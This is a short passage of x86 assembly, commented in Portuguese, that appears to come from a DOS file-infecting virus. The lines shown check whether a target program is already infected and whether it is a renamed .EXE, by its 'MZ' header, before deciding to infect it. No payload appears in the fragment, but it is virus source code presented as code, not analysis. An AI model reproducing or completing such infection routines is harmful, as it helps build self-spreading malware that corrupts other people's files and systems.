                                ;
continua:                       ;
                                ;
cmp [Original+bp+3],90h         ; Testa pra ver se ja estava infectado
je NaoInfectar                  ;
                                ;
cmp word ptr [Original+bp],'ZM' ; Testa pra ver se naun eh um .EXE renomeado
